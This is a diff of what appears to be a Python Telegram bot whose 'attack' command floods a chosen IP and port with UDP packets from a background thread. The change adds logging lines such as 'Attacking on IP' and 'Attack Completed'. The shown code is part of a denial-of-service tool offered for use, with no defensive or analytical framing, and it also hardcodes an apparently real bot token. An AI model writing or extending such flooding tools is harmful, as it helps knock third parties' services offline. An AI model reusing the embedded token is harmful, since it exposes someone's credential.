@@ -30,6 +30,8 @@ def attack(update, context):
     )
 
     def send_packet(amplifier):
+        print(f"Attacking on IP: {host} Port: {port} for Time: {second}")
+
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.connect((host, port))
@@ -40,6 +42,7 @@ def attack(update, context):
 
     threading.Thread(target=send_packet(800), daemon=True).start()
     update.message.reply_text("Attack Completed")
+    print("Attack Completed")
 
 
 Token = "7150508963:AAGiTQr9F3os6CMv-9rTfRQVJWOJKB-82vo"
